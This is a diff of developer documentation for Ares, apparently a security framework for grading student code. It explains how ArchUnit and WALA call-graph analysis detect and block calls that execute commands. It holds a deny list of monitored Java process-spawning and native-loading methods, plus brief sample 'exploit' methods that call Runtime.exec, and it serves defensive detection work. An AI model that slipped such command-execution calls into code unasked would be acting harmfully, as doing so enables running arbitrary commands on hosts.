@@ -16,10 +16,12 @@
 5. [Ares Validates the Command Execution](#5-ares-validates-the-command-execution)
    - [5.1 ArchUnit Mode: Static Analysis](#51-archunit-mode-static-analysis)
    - [5.2 WALA Mode: Call Graph Analysis](#52-wala-mode-call-graph-analysis)
-   - [5.3 Transitive Access Detection](#53-transitive-access-detection)
-   - [5.4 Reachability Analysis (WALA)](#54-reachability-analysis-wala)
+   - [5.3 Transitive Access Detection (ArchUnit)](#53-transitive-access-detection-archunit)
+   - [5.4 Sink Evaluation and Reverse Reachability (WALA)](#54-sink-evaluation-and-reverse-reachability-wala)
    - [5.5 False Positive Filtering (WALA)](#55-false-positive-filtering-wala)
-6. [Conclusion](#6-conclusion)
+   - [5.6 Legacy Utilities: ReachabilityChecker and CustomDFSPathFinder](#56-legacy-utilities-reachabilitychecker-and-customdfspathfinder)
+6. [Writing Architecture Test Cases](#6-writing-architecture-test-cases)
+7. [Conclusion](#7-conclusion)
 
 ---
 
@@ -51,8 +53,8 @@ Architecture testing validates that code follows specific structural rules by an
 - **Method**: Analyzes class dependencies and method calls in compiled bytecode
 - **Use Case**: Detecting direct and transitive method access patterns to command execution APIs
 
-### **WALA (Dynamic Call Graph Analysis)**
-- **Type**: Static analysis with dynamic modeling using IBM WALA framework
+### **WALA (Call Graph Analysis)**
+- **Type**: Static analysis with call-graph modeling using IBM WALA framework
 - **Strength**: Precise call path detection, understands complex call chains
 - **Method**: Builds a complete call graph representing all possible method invocations
 - **Use Case**: Finding reachable command execution methods through complex call chains
@@ -75,15 +77,19 @@ Security policies are configured through settings that instructors can adjust:
 
 | Setting | Type | Description | Example |
 |---------|------|-------------|---------|
-| **architectureMode** | `String` | Analysis framework | `"ARCHUNIT"` or `"WALA"` |
-| **allowedPackages** | `PackagePermission[]` | Packages allowed to be imported/used | `[new PackagePermission("java.lang")]` |
-| **classPath** | `String` | Path to compiled student code | `"target/classes"` |
-| **restrictedPackage** | `String` | Package containing student code | `"de.student."` |
+| **programmingLanguageConfiguration** | `ProgrammingLanguageConfiguration` (enum) | Bakes the architecture mode (`ARCHUNIT` or `WALA`), build tool, and AOP mode into one policy value | `JAVA_USING_MAVEN_ARCHUNIT_AND_ASPECTJ` |
+| **allowedClasses** | `ClassPermission[]` | Classes exempt from the method-based architecture rules (including command execution) | `[new ClassPermission("de.example.TrustedHelper")]` |
+| **allowedPackages** | `PackagePermission[]` | Packages allowed to be imported (only used by the `PACKAGE_IMPORT` rule) | `[new PackagePermission("java.lang")]` |
+| **theSupervisedCodeUsesTheFollowingPackage** | `String` (part of `SupervisedCode`) | Base package of the supervised (student) code | `"de.student"` |
+
+**Notes on the analysis mode and classpath:**
+- The architecture mode itself is the enum `ArchitectureMode` with the two constants `ARCHUNIT` and `WALA`. There is no free-standing `architectureMode` policy setting; the mode is derived from `ProgrammingLanguageConfiguration`. The `String` form (`"ARCHUNIT"` / `"WALA"`) only appears as a parameter of `writeArchitectureTestCase(...)` and `executeArchitectureTestCase(...)`.
+- There is no `classPath` policy setting either: the classpath to analyse is derived from the build mode (Maven/Gradle), and the supervised scope comes from `SupervisedCode.theSupervisedCodeUsesTheFollowingPackage`.
 
 **Architecture-Specific Configuration:**
 - No command-based permissions (no `commandsAllowedToBeExecuted`, etc.) - Architecture testing detects ANY command execution attempt
-- No AOP mode selection - Uses `architectureMode` instead
-- Package-level permissions instead of command-level permissions
+- No AOP mode selection - Uses the architecture mode instead
+- Class-level exemptions (`allowedClasses`) instead of command-level permissions
 
 ---
 
@@ -91,10 +97,10 @@ Security policies are configured through settings that instructors can adjust:
 
 Access is **BLOCKED** 🔴 when **ALL** conditions are true:
 
-1. **Architecture Mode Enabled**: `architectureMode == "ARCHUNIT"` or `architectureMode == "WALA"`
+1. **Architecture Mode Enabled**: The configuration uses `ArchitectureMode.ARCHUNIT` or `ArchitectureMode.WALA`
 2. **Student Code Contains Command Execution Calls**: Analysis detects method calls to command execution APIs
 3. **Calls Are Reachable**: The forbidden methods can be reached from student code (directly or transitively)
-4. **Not in Allowed Packages**: The accessed classes are not in the `allowedPackages` list
+4. **Not an Allow-Listed Class**: The calling class is not in the `allowedClasses` (`ClassPermission`) allow-list. (`allowedPackages` does NOT exempt command execution; it only feeds the `PACKAGE_IMPORT` rule.)
 
 **If ANY condition fails → No Violation Detected** 🟢
 
@@ -112,13 +118,13 @@ Access is **BLOCKED** 🔴 when **ALL** conditions are true:
 ## 1.4 What Code Is Trusted vs. Restricted?
 
 **Trusted Code (No Restrictions):**
-- Code outside the `restrictedPackage`
-- JDK standard library (unless explicitly checking imports)
-- Ares internal code
+- Classes on the `allowedClasses` allow-list
+- Ares internal code (`de.tum.cit.ase.ares.api.*` is excluded from the ArchUnit import and classified as infrastructure by WALA)
+- In WALA mode, infrastructure frames identified by `WalaPathClassification` (`java.`, `javax.`, `sun.`, `jdk.`, `com.sun.`, Ares, Byte Buddy, AspectJ, WALA, ArchUnit, and the configured test-helper prefixes)
 
 **Restricted Code (Subject to Security Checks):**
-- All code within `restrictedPackage`
-- All classes that call command execution methods from the forbidden lists
+- ArchUnit mode: every imported class from the analysed classpath except excluded Ares internals, unless the class is allow-listed
+- WALA mode: entry-reachable code from the package prefix derived from the analysed classpath, with violations attributed to the nearest non-infrastructure student frame
 
 **Security Assumptions:** 
 - Student code is compiled and available as `.class` files
@@ -145,9 +151,62 @@ Instead of intercepting method calls at runtime (AOP approach), architecture tes
 
 ---
 
+## 2.1 COMMAND SYSTEM - EXECUTE Operations
+
+**Monitored Methods (loaded from `command-execution-methods.txt`, 12 entries in each file):**
+
+**java.lang.Runtime:**
+- `Runtime.exec(String)`
+- `Runtime.exec(String[])`
+- `Runtime.exec(String, String[])`
+- `Runtime.exec(String[], String[])`
+- `Runtime.exec(String, String[], File)`
+- `Runtime.exec(String[], String[], File)`
+- `Runtime.load(String)`
+- `Runtime.loadLibrary(String)`
+
+**java.lang.ProcessBuilder:**
+- `ProcessBuilder.<init>(String[])` - Constructor
+- `ProcessBuilder.<init>(List)` - Constructor
+- `ProcessBuilder.start()`
+- `ProcessBuilder.startPipeline` - Static method (listed without parameters, matched by prefix)
+
+**Method Signature Format:**
+
+The two files use different parameter notations. Entries omit return types; blank lines and lines whose first non-whitespace character is `#` are ignored by `FileTools.readMethodsFile`.
+
+*ArchUnit file (source form):*
+```
+java.lang.Runtime.exec(java.lang.String)
+java.lang.ProcessBuilder.<init>(java.lang.String[])
+java.lang.ProcessBuilder.start()
+```
+
+*WALA file (JVM descriptor parameters, no return type):*
+```
+java.lang.Runtime.exec(Ljava/lang/String;)
+java.lang.ProcessBuilder.<init>([Ljava/lang/String;)
+java.lang.ProcessBuilder.start()
+```
+
+**Why These Methods?**
+
+These are the **primary APIs** in Java for spawning system processes and loading native code:
+- `Runtime.exec()`: Direct command execution through shell
+- `Runtime.load()` / `Runtime.loadLibrary()`: Loading native libraries, which can execute arbitrary native code
+- `ProcessBuilder`: More flexible process creation with environment control
+
+**Coverage:**
+- ✅ All overloaded variants of `Runtime.exec()`
+- ✅ Native library loading (`Runtime.load()`, `Runtime.loadLibrary()`)
+- ✅ ProcessBuilder constructors (command stored in object)
+- ✅ ProcessBuilder.start() and ProcessBuilder.startPipeline() (actual process spawn)
+
+---
+
 # 3. Student Code Triggers Security Check
 
-When student code (any code within the configured restricted package) attempts to use one of these command execution methods, the architecture analysis will detect it during the test phase.
+When student code (any code within the supervised package) attempts to use one of these command execution methods, the architecture analysis will detect it during the test phase.
 
 **Example:**
 ```java
@@ -170,12 +229,12 @@ public class StudentSolution {
 1. `ClassFileImporter` loads `StudentSolution.class`
 2. Analyzes that `maliciousAction()` method calls `Runtime.exec()`
 3. Checks if `Runtime.exec()` is in the forbidden methods list
-4. Reports violation: "StudentSolution.maliciousAction transitively accesses Runtime.exec"
+4. Reports violation: "StudentSolution.maliciousAction accesses Runtime.exec"
 
 **WALA Mode:**
 1. Builds call graph from student code entry points
-2. Performs reachability analysis: Can `Runtime.exec()` be reached from student code?
-3. Finds path: `StudentSolution.maliciousAction → Runtime.exec`
+2. Collects all forbidden sinks in the call graph and checks which are reachable from the entry points
+3. Reconstructs a witness path: `StudentSolution.maliciousAction → Runtime.exec`
 4. Reports violation with source line number
 
 **Key Difference from AOP:**
@@ -197,20 +256,31 @@ During architecture analysis, Ares collects information about the code structure
 
 **Step 1: Import Compiled Classes**
 
+There are two importer variants, depending on where the analysis runs:
+
+*Runtime execution path (`ArchitectureMode.getJavaClasses(classPath)`):*
+```java
+JavaClasses javaClasses = new ClassFileImporter()
+    .withImportOption(location ->
+        !location.toString().replace("\\", "/").contains("/de/tum/cit/ase/ares/api/"))  // Exclude Ares internal classes
+    .importPath(classPath);  // Import everything on the class path
+```
+
+*Generated-code template path (`JavaArchunitTestCase.javaClassesAsCode()`):*
 ```java
 JavaClasses javaClasses = new ClassFileImporter()
     .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
     .withImportOption(location -> {
         String path = location.toString().replace("\\", "/");
-        return !path.contains("/ares/api/");  // Exclude Ares internal classes
+        return !path.contains("/de/tum/cit/ase/ares/api/");  // Exclude Ares internal classes
     })
-    .importPackages("de.student");  // Import student package
+    .importPackages("de.student");  // Import the analysed packages
 ```
 
 **What happens:**
-1. ClassFileImporter scans the classpath for `.class` files
+1. ClassFileImporter scans the classpath (runtime path) or the given packages (generated-code path) for `.class` files
 2. Loads class metadata (methods, fields, dependencies)
-3. Excludes test classes and Ares internal classes
+3. Excludes Ares internal classes (`/de/tum/cit/ase/ares/api/`); the generated-code variant additionally excludes test classes
 4. Creates `JavaClasses` object containing all analyzed classes
 
 **Analysis Process:**
@@ -260,16 +330,8 @@ class Helper {
 // Build call graph
 CallGraph cg = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);
 
-// Find reachable forbidden methods
-List<CGNode> path = ReachabilityChecker.findReachableMethods(
-    cg, 
-    cg.getEntrypointNodes().iterator(),
-    node -> forbiddenMethods.contains(node.getMethod().getSignature())
-);
-
-if (path != null) {
-    throw new AssertionError("Forbidden method reachable: " + path);
-}
+// Check the rule against the call graph (throws AssertionError on violation)
+JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(cg, allowedClasses);
 ```
 
 **Analysis Process:**
@@ -277,13 +339,13 @@ if (path != null) {
 2. **Build Class Hierarchy**: Resolve all type relationships
 3. **Construct Call Graph**: Map all possible method call relationships
 4. **Find Entry Points**: Identify starting methods in student code
-5. **Reachability Analysis**: Use DFS to find paths to forbidden methods
-6. **Filter False Positives**: Remove JDK helper paths
+5. **Sink Collection and Reachability**: Collect all forbidden sinks and check which are reachable from the entry points (forward BFS)
+6. **Path Classification**: Reconstruct witness paths per sink and filter transitive-JDK false positives
 
 **Strengths:**
 - ✅ Very precise call path detection
 - ✅ Understands complex call patterns (lambdas, method references)
-- ✅ Can filter out JDK internal calls (false positive reduction)
+- ✅ Can filter out transitive JDK-internal calls (false positive reduction)
 - ✅ Provides exact call paths with line numbers
 - ✅ Models runtime behavior more accurately
 
@@ -308,90 +370,9 @@ class StudentCode {
 // Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
 ```
 
-**Special WALA Features:**
+**Special WALA Feature - Infrastructure Frame Classification:**
 
-**JDK Helper Filtering:**
-WALA mode includes intelligent filtering of JDK-internal helper classes that may legitimately invoke process-related operations:
-```java
-private static final List<String> JDK_HELPERS = List.of(
-    "java/lang/ClassLoader",
-    "sun/launcher/LauncherHelper"
-);
-
-// Ignores paths like: StudentCode → ClassLoader.loadLibrary (legitimate JDK operation)
-// Detects real violations: StudentCode → Runtime.exec (direct command execution)
-```
-
----
-
-# 3. Monitored Command System Methods
-
-Both ArchUnit and WALA modes monitor the same set of command execution methods, loaded from template files:
-
-**Template Locations:**
-- **ArchUnit**: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/archunit/methods/command-execution-methods.txt`
-- **WALA**: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/wala/methods/command-execution-methods.txt`
-
----
-
-## 3.1 COMMAND SYSTEM - EXECUTE Operations
-
-**Monitored Methods (loaded from `command-execution-methods.txt`):**
-
-**java.lang.Runtime:**
-- `Runtime.exec(String)`
-- `Runtime.exec(String, String[])`
-- `Runtime.exec(String, String[], File)`
-- `Runtime.exec(String[])`
-- `Runtime.exec(String[], String[])`
-- `Runtime.exec(String[], String[], File)`
-
-**java.lang.ProcessBuilder:**
-- `ProcessBuilder.<init>(String...)` - Constructor
-- `ProcessBuilder.<init>(List<String>)` - Constructor
-- `ProcessBuilder.start()`
-
-**Method Signature Format:**
-```
-java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;
-java.lang.ProcessBuilder.<init>([Ljava/lang/String;)V
-java.lang.ProcessBuilder.start()Ljava/lang/Process;
-```
-
-**Why These Methods?**
-
-These are the **primary APIs** in Java for spawning system processes:
-- `Runtime.exec()`: Direct command execution through shell
-- `ProcessBuilder`: More flexible process creation with environment control
-
-**Coverage:**
-- ✅ All overloaded variants of `Runtime.exec()`
-- ✅ ProcessBuilder constructors (command stored in object)
-- ✅ ProcessBuilder.start() (actual process spawn)
-
----
-
-# 4. ArchUnit Analysis Flow
-
-## 4.1 Loading Java Classes
-
-**Step 1: Import Compiled Classes**
-
-```java
-JavaClasses javaClasses = new ClassFileImporter()
-    .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
-    .withImportOption(location -> {
-        String path = location.toString().replace("\\", "/");
-        return !path.contains("/ares/api/");  // Exclude Ares internal classes
-    })
-    .importPackages("de.student");  // Import student package
-```
-
-**What happens:**
-1. ClassFileImporter scans the classpath for `.class` files
-2. Loads class metadata (methods, fields, dependencies)
-3. Excludes test classes and Ares internal classes
-4. Creates `JavaClasses` object containing all analyzed classes
+WALA mode classifies each call-graph frame as either student-authored or infrastructure (JDK / Ares / test framework) via `WalaPathClassification.INFRA_PREFIXES` (e.g. `java.`, `javax.`, `sun.`, `jdk.`, `com.sun.`, `de.tum.cit.ase.ares.api.`, `net.bytebuddy.`, `org.aspectj.`, `com.ibm.wala.`, `com.tngtech.archunit.`). Violations are attributed to the nearest student frame, never to an intermediate JDK method (see [5.5](#55-false-positive-filtering-wala) for the false-positive rules).
 
 ---
 
@@ -403,12 +384,9 @@ JavaClasses javaClasses = new ClassFileImporter()
 
 **How it works:**
 ```java
-// Define rule
-ArchRule rule = noClasses()
-    .should(new TransitivelyAccessesMethodsCondition(
-        javaAccess -> forbiddenMethods.contains(javaAccess.getTarget().getFullName())
-    ))
-    .as("No class should execute commands");
+// The runtime execution path uses the allow-aware rule
+ArchRule rule = JavaArchunitTestCaseCollection.allowAwareRuleFor(
+    JavaArchitectureTestCaseSupported.COMMAND_EXECUTION, allowedClasses, allowedPackages);
 
 // Execute rule
 rule.check(javaClasses);  // Throws AssertionError if violated
@@ -416,29 +394,32 @@ rule.check(javaClasses);  // Throws AssertionError if violated
 
 **Step 2: Create Architecture Rule**
 
+The rule is built by `createNoClassShouldHaveMethodRule(...)` in `JavaArchunitTestCaseCollection`. The forbidden methods are loaded lazily on the first predicate evaluation, converted with `convertArrayNotation` (Java-style `java.lang.String[]` → JNI-style `[Ljava.lang.String;` as used by ArchUnit's `getFullName()`), and empty entries are filtered out:
+
 ```java
-// Load forbidden methods from template file
-Set<String> forbiddenMethods = FileTools.readMethodsFile(
-    FileTools.readFile(FileHandlerConstants.ARCHUNIT_COMMAND_EXECUTION_METHODS)
-);
+private static ArchRule createNoClassShouldHaveMethodRule(String ruleName, Path methodsFilePath,
+        Set<ClassPermission> allowedClasses) {
+    return ArchRuleDefinition.noClasses().that(isNotAllowedClass(allowedClasses))
+            .should(new TransitivelyAccessesMethodsCondition(new DescribedPredicate<>(ruleName) {
+                private Set<String> forbiddenMethods;
 
-// Create custom condition that checks method access
-DescribedPredicate<JavaAccess<?>> checkForbiddenAccess = 
-    new DescribedPredicate<>("accesses forbidden command execution method") {
-        @Override
-        public boolean test(JavaAccess<?> javaAccess) {
-            return forbiddenMethods.stream()
-                .anyMatch(method -> javaAccess.getTarget().getFullName().startsWith(method));
-        }
-    };
-
-// Create rule that no class should access forbidden methods
-ArchRule rule = ArchRuleDefinition.noClasses()
-    .should(new TransitivelyAccessesMethodsCondition(checkForbiddenAccess))
-    .as("No class should execute commands");
+                @Override
+                public boolean test(JavaAccess<?> javaAccess) {
+                    if (forbiddenMethods == null) {
+                        forbiddenMethods = FileTools.readMethodsFile(FileTools.readFile(methodsFilePath)).stream()
+                                .map(JavaArchunitTestCaseCollection::convertArrayNotation)
+                                .collect(Collectors.toSet());
+                    }
+                    return forbiddenMethods.stream().filter(method -> !method.isEmpty())
+                            .anyMatch(method -> javaAccess.getTarget().getFullName().startsWith(method));
+                }
+            })).as(ruleName);
+}
 ```
 
 **Rule Components:**
+- **Rule name**: The localised string `"Executes commands"` (message key `security.architecture.execute.command`), applied via `.as(ruleName)`
+- **`.that(isNotAllowedClass(allowedClasses))`**: Exempts allow-listed classes; with an empty allow-list the rule applies to every class (this unfiltered form is the static constant `NO_CLASS_MUST_EXECUTE_COMMANDS` used by the generated-template path)
 - **DescribedPredicate**: Tests if a method access is forbidden
 - **TransitivelyAccessesMethodsCondition**: Finds transitive access paths
 - **ArchRule**: Complete rule that can be checked against JavaClasses
@@ -456,24 +437,19 @@ try {
 
 **When violation is found:**
 ```
-Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
-Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
+Architecture Violation [Priority: MEDIUM] - Rule 'Executes commands' was violated (1 times):
+Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(java.lang.String)> by
   [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
 ```
 
-**Error is converted to:**
+**Error is converted to** (message key `security.archunit.violation.error`, with the action `"execute a command"` derived from the rule name via `mapRuleNameToAction`):
 ```java
 throw new SecurityException(
     "Ares Security Error (Reason: Student-Code; Stage: Execution): " +
-    "Illegal command execution: StudentCode.exploit transitively calls Runtime.exec"
+    "de.student.StudentCode.exploit() tried to illegally execute a command " +
+    "via java.lang.Runtime.exec(java.lang.String) (called by de.student.StudentCode) " +
+    "but was blocked by Ares."
 );
-```
-
-**Violation Example:**
-```
-Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
-Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
-  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
 ```
 
 **Best For:**
@@ -486,21 +462,38 @@ Method <de.student.StudentCode.exploit()> transitively accesses method <java.lan
 ## 5.2 WALA Mode: Call Graph Analysis
 
 **How it works:**
+
+The runtime execution path calls `WalaRule.check(CallGraph, Set<ClassPermission>)` (`WalaRule.java`), which performs the following steps:
+
 ```java
-// Build call graph
-CallGraph cg = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);
+public void check(CallGraph cg, Set<ClassPermission> allowedClasses) {
+    // 1. Collect every forbidden sink in the call graph (sorted by
+    //    signature so the reported violation is deterministic)
+    List<CGNode> sinks = ...;
+    if (sinks.isEmpty()) {
+        return;
+    }
 
-// Find reachable forbidden methods
-List<CGNode> path = ReachabilityChecker.findReachableMethods(
-    cg, 
-    cg.getEntrypointNodes().iterator(),
-    node -> forbiddenMethods.contains(node.getMethod().getSignature())
-);
+    // 2. Forward BFS from the entry points
+    Set<CGNode> entryReachable = forwardReachableFromEntrypoints(cg);
+    if (entryReachable.isEmpty()) {
+        // Fail closed: sinks exist but nothing is reachable, so the
+        // analysis was mis-scoped and must not silently pass
+        throw new SecurityException(Messages.localized(
+            "security.architecture.wala.entrypoints.empty", ruleName));
+    }
 
-if (path != null) {
-    throw new AssertionError("Forbidden method reachable: " + path);
+    // 3. For each reachable sink, reverse-walk towards the entry points
+    //    and evaluate every distinct nearest-student approach
+    for (CGNode sink : sinks) {
+        if (entryReachable.contains(sink)) {
+            evaluateSink(cg, sink, allowedClasses, entryReachable);  // throws on genuine violation
+        }
+    }
 }
 ```
+
+Each reconstructed witness path (entry → ... → forbidden sink) is classified by `WalaPathClassification` (see [5.4](#54-sink-evaluation-and-reverse-reachability-wala) and [5.5](#55-false-positive-filtering-wala)); the first genuine, non-exempt violation throws an `AssertionError`.
 
 **Example Violation Detection:**
 ```java
@@ -517,12 +510,12 @@ class StudentCode {
 // Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
 ```
 
-**Violation Example:**
+**Violation Example** (message key `security.architecture.method.call.message`, format `'%s'\n Method <%s> calls method <%s> in (%s.java:%d) accesses <%s>`):
 ```
-Forbidden method 'java.lang.ProcessBuilder.start()Ljava/lang/Process;' is reachable from 'de.student.StudentCode.exploit()V' 
-in class 'de.student.StudentCode' at line 23
-Called by test method: 'org.example.TestClass.testExploit()V'
+'Executes commands'
+ Method <de.student.StudentCode.exploit()> calls method <java.lang.ProcessBuilder.start()> in (ProcessBuilder.java:1170) accesses <de.student.StudentCode.exploit()>
 ```
+The placeholders are: rule name, caller signature (nearest student frame), forbidden method signature, declaring class of the sink, source line, and entry-point signature. WALA's JVM-descriptor signatures are converted to source form via `formatJvmSignature` so the resulting `SecurityException` matches the format ArchUnit produces.
 
 **Best For:**
 - Precise violation detection
@@ -532,33 +525,41 @@ Called by test method: 'org.example.TestClass.testExploit()V'
 
 ---
 
-## 5.3 Transitive Access Detection
+## 5.3 Transitive Access Detection (ArchUnit)
 
 **How TransitivelyAccessesMethodsCondition Works:**
 
 ```java
 public class TransitivelyAccessesMethodsCondition extends ArchCondition<JavaClass> {
-    
+
+    private final TransitiveAccessPath transitiveAccessPath = new TransitiveAccessPath();
+
     @Override
     public void check(JavaClass clazz, ConditionEvents events) {
         // Get all method accesses from this class
-        for (JavaAccess<?> access : clazz.getAccessesFromSelf()) {
-            // Find transitive path to forbidden method
-            List<JavaAccess<?>> path = findPathToViolatingMethod(access);
-            
+        for (JavaAccess<?> accessInsideClass : clazz.getAccessesFromSelf()) {
+            // Find transitive path to a violating (forbidden) method
+            List<JavaAccess<?>> path = transitiveAccessPath.findPathFromViolatingMethodTo(accessInsideClass);
+
             if (!path.isEmpty()) {
                 // Report violation with complete call chain
-                events.add(createViolationEvent(access, path));
+                events.add(newTransitiveAccessPathFoundEvent(accessInsideClass, path));
             }
         }
     }
-    
-    private List<JavaAccess<?>> findPathToViolatingMethod(JavaAccess<?> access) {
-        // Use DFS to find path from current access to forbidden method
-        // Returns: [access1 -> access2 -> ... -> forbiddenAccess]
+
+    private class TransitiveAccessPath {
+        List<JavaAccess<?>> findPathFromViolatingMethodTo(JavaAccess<?> access) {
+            // Recursive DFS through the access graph, tracking already
+            // analysed methods to avoid cycles; the path is built in
+            // reverse and then reversed before being returned:
+            // [access1 -> access2 -> ... -> forbiddenAccess]
+        }
     }
 }
 ```
+
+The violation event is created by `newTransitiveAccessPathFoundEvent(...)`, which builds the "(transitively) accesses <...> by [...]" message and wraps it in `SimpleConditionEvent.satisfied(access, message)`.
 
 **Example Path Detection:**
 
@@ -573,75 +574,25 @@ Result: Path found = [StudentCode.exploit → Helper.runCommand → Runtime.exec
 
 ---
 
-## 5.4 Reachability Analysis (WALA)
+## 5.4 Sink Evaluation and Reverse Reachability (WALA)
 
-**Step 4: Find Paths to Forbidden Methods**
+**Step 4: Evaluate Each Forbidden Sink**
 
-```java
-// Load forbidden methods
-Set<String> forbiddenMethods = FileTools.readMethodsFile(
-    FileTools.readFile(FileHandlerConstants.WALA_COMMAND_EXECUTION_METHODS)
-);
+Instead of a single forward DFS, `WalaRule` examines every forbidden sink individually (`evaluateSink`):
 
-// Find reachable forbidden methods
-List<CGNode> path = ReachabilityChecker.findReachableMethods(
-    callGraph,
-    callGraph.getEntrypointNodes().iterator(),
-    node -> forbiddenMethods.stream()
-        .anyMatch(sig -> node.getMethod().getSignature().startsWith(sig))
-);
+1. **Reverse walk from the sink** through infrastructure frames only (`WalaPathClassification.isInfraFrame`), using a `Deque`-based worklist over `cg.getPredNodes(...)`.
+2. Every time the walk reaches a **non-infrastructure predecessor** (a "nearest-student approach" `[nearestStudentFrame, ...infra..., sink]`), that approach is evaluated immediately (`evaluateApproach`).
+3. `evaluateApproach` builds the full witness path by prefixing an entry-to-student path (reverse BFS, `reversePathToEntry`); when the nearest student frame is itself allow-listed, it prefers a prefix routing through a non-allowed student ancestor so a violation cannot hide behind an allow-listed helper.
+4. `evaluatePath` classifies the path (see [5.5](#55-false-positive-filtering-wala)) and, for a genuine violation, throws an `AssertionError` with the localised method-call message.
+5. A backstop of `MAX_APPROACHES_PER_SINK = 64` bounds the reverse walk per sink; reaching it is logged as a warning, never a silent pass.
 
-if (path != null && !path.isEmpty()) {
-    // Extract source position
-    IMethod.SourcePosition sourcePos = path.get(path.size() - 1)
-        .getMethod()
-        .getSourcePosition(0);
-    
-    throw new AssertionError(String.format(
-        "Forbidden method '%s' reachable from '%s' at line %d",
-        path.get(path.size() - 1).getMethod().getSignature(),
-        path.get(0).getMethod().getSignature(),
-        sourcePos.getFirstLine()
-    ));
-}
-```
+**Why per-sink reverse reachability instead of one forward DFS?**
 
-**DFS Path Finding Algorithm:**
+The previous forward DFS (`CustomDFSPathFinder`, see [5.6](#56-legacy-utilities-reachabilitychecker-and-customdfspathfinder)) marked nodes globally visited, so each sink was reported on exactly one path. An allow-listed or false-positive caller discovered first could permanently mask a genuine violation by a different caller of the same sink. Evaluating every distinct nearest-student approach per sink eliminates that masking.
 
-```java
-public class CustomDFSPathFinder {
-    List<CGNode> find() {
-        Set<CGNode> visited = new HashSet<>();
-        Stack<CGNode> currentPath = new Stack<>();
-        
-        for (CGNode entryPoint : entryPoints) {
-            List<CGNode> result = dfs(entryPoint, visited, currentPath);
-            if (result != null) return result;
-        }
-        return null;
-    }
-    
-    List<CGNode> dfs(CGNode node, Set<CGNode> visited, Stack<CGNode> path) {
-        if (visited.contains(node)) return null;
-        visited.add(node);
-        path.push(node);
-        
-        // Check if this node is a target
-        if (isTargetNode(node)) {
-            return new ArrayList<>(path);  // Found path!
-        }
-        
-        // Recursively check successors
-        for (CGNode successor : callGraph.getSuccNodes(node)) {
-            List<CGNode> result = dfs(successor, visited, path);
-            if (result != null) return result;
-        }
-        
-        path.pop();
-        return null;
-    }
-}
-```
+**Fail-Closed Entry Points:**
+
+If forbidden sinks exist but `cg.getEntrypointNodes()` is empty, the analysis was mis-scoped (e.g. the entry-point package prefix did not match the analysed classes). `WalaRule.check` then throws a `SecurityException` (message key `security.architecture.wala.entrypoints.empty`) instead of silently passing.
 
 **Example Reachability Detection:**
 
@@ -659,77 +610,84 @@ Path: [StudentCode.exploit, ProcessBuilder.<init>, ProcessBuilder.start]
 
 ## 5.5 False Positive Filtering (WALA)
 
-**Challenge:** Some JDK classes may legitimately use ProcessBuilder internally for system operations (e.g., launching native libraries).
+**Challenge:** Student code may use a permitted JDK API (e.g. `BufferedReader`, `AsynchronousSocketChannel`) whose internal implementation transitively reaches a forbidden method. The student did not intentionally call the forbidden API; it was an internal JDK side-effect.
 
-**Solution:** Filter out paths that only go through JDK helper classes.
+**Solution:** Per-path classification in `WalaPathClassification`:
 
 ```java
-private static final List<String> JDK_HELPERS = List.of(
-    "Ljava/lang/ClassLoader", "java/lang/ClassLoader",
-    "Lsun/launcher/", "sun/launcher/"
-);
+// Package prefixes classified as infrastructure (never attributed as student code)
+public static final List<String> INFRA_PREFIXES = List.of("java.", "javax.", "sun.", "jdk.", "com.sun.",
+        "de.tum.cit.ase.ares.api.", "net.bytebuddy.", "org.aspectj.", "com.ibm.wala.", "com.tngtech.archunit.",
+        "anonymous.toolclasses.", "metatest.");
 
-private static final List<String> ALLOWED_HELPER_APIS = List.of(
-    "java.lang.ClassLoader.loadLibrary",
-    "java.lang.Runtime.loadLibrary"
-);
-
-// Check if path should be ignored
-boolean isHelperPath(List<CGNode> path) {
-    CGNode forbidden = path.get(path.size() - 1);
-    
-    // Is the forbidden API actually an allowed helper API?
-    boolean helperApi = ALLOWED_HELPER_APIS.stream()
-        .anyMatch(sig -> forbidden.getMethod().getSignature().startsWith(sig));
-    
-    // Does the path contain JDK helper classes?
-    boolean helperSeen = path.stream().anyMatch(node -> {
-        String cls = node.getMethod().getDeclaringClass().getName().toString();
-        return JDK_HELPERS.stream().anyMatch(cls::startsWith);
-    });
-    
-    // Ignore if it's a helper API called through helper classes
-    return helperApi && helperSeen;
-}
+// Subset that indicates a genuine transitive-JDK false positive
+// (project test helpers are deliberately omitted)
+static final List<String> TRANSITIVE_FALSE_POSITIVE_PREFIXES = List.of("java.", "javax.", "sun.", "jdk.",
+        "com.sun.", "de.tum.cit.ase.ares.", "net.bytebuddy.", "org.aspectj.", "com.ibm.wala.",
+        "com.tngtech.archunit.");
 ```
+
+**How a path is classified** (`evaluatePath` in `WalaRule`):
+1. `nearestStudentFrame(path)` scans from the sink towards the entry point and returns the first non-infrastructure frame. If the entire path is infrastructure, the path is ignored.
+2. `isFalsePositiveTransitivePath(path, studentIdx)` returns `true` when every frame strictly between the nearest student frame and the sink is a transitive-false-positive frame. Such paths are ignored.
+3. **Direct violations are never suppressed**: if the student frame is immediately adjacent to the forbidden sink (no intermediate frames), the path is always reported.
+4. Allow-listed classes (`ClassPermission`) exempt a path ONLY when every student frame on it is allow-listed; otherwise the violation is attributed to the nearest non-allowed student frame.
 
 **Example Filtering:**
 
-**Path 1 (Ignored):**
+**Path 1 (Ignored - transitive JDK false positive):**
 ```
-StudentCode.loadNativeLib()
+StudentCode.readFile()
